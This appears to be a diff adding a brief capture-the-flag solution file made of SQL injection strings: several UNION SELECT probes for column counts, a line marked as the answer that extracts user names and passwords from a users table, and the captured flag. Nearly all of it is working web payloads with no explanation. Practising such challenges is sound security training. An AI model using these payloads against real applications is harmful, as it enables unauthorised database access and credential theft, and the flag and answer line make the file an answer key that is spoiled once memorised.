@@ -1,0 +1,13 @@
+select id, user, post from posts where user = '' union select * from posts;--';
+select id, user, post from posts where user = '' union select 1,2,3 from users;--';
+
+' union select 1, 2, 3, 4 from posts; --
+' union SELECT 1,2 FROM users;--
+' union select user,2,3 from users;--
+
+
+
+//ANSWER
+//Register for 
+' union select user,pass,3 from users;--
+flag{union?_why_not_onion_b6e6a3cd8e3f1fe5f6109d1618bddbd1}	
